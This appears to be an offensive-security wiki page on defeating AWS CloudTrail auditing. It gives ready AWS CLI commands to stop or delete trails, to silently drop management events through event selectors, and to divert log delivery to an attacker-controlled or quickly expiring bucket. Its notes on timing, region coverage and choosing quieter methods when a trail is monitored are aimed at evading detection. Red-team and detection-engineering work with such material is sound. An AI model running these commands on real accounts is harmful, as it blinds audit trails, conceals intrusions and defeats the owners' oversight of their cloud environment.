---
title: "CloudTrail: stopping, deleting, and diverting the API audit trail"
description: "Disabling, deleting, or diverting CloudTrail trails and stopping logging to blind account-level auditing."
keywords:
  - CloudTrail
  - StopLogging
  - trail
  - log tampering
  - detection evasion
---

# CloudTrail

CloudTrail is the record of every API call in the account, so it is the first thing an operator degrades to act unseen. The levers run from the blunt (stop or delete the trail) to the subtle (keep the trail but stop it recording the events you care about), and the right one depends on how closely the trail is watched and where its logs land.

## Stop or delete the trail

```bash
aws cloudtrail list-trails
aws cloudtrail stop-logging --name <trail>          # halts delivery, trail still exists
aws cloudtrail delete-trail --name <trail>          # removes it entirely
```

## Narrow what it records

Quieter than stopping: keep the trail green on the dashboard but drop the events you are about to generate.

```bash
# stop recording management and data events without deleting the trail
aws cloudtrail put-event-selectors --trail-name <trail> \
  --event-selectors '[{"ReadWriteType":"None","IncludeManagementEvents":false}]'
```

## Divert the delivery

```bash
# point the trail at a bucket you control, or one with a 1-day lifecycle expiry
aws cloudtrail update-trail --name <trail> --s3-bucket-name <attacker-or-expiring-bucket>
```

## Exploitation notes

- `StopLogging`, `DeleteTrail`, and `UpdateTrail` are themselves logged: the call is clean only if it lands before the record is shipped somewhere out of your reach, which is why organization trails delivering cross-account are hard to blind quietly.
- A multi-region trail needs handling in every region; a single-region trail leaves the others recording.
- Organization trails created in the management account cannot be stopped from a member account, so confirm where the trail lives before relying on silence.
- Prefer `put-event-selectors` narrowing over deletion when the trail is monitored for existence.

## Tools

- **AWS CLI** (`cloudtrail`): all of the above.
- **Pacu** (`detection__disruption`): enumerates and disrupts CloudTrail, GuardDuty, and Config in one step.
- **Stratus Red Team**: ready-made CloudTrail stop and delete detonations.

## References

- [HackTricks Cloud: CloudTrail evasion](https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/aws-defense-evasion/aws-cloudtrail-enum.html)
- [Stratus Red Team: stop CloudTrail trail](https://stratus-red-team.cloud/attack-techniques/AWS/aws.defense-evasion.cloudtrail-stop/)
- [AWS: StopLogging API](https://docs.aws.amazon.com/awscloudtrail/latest/APIReference/API_StopLogging.html)
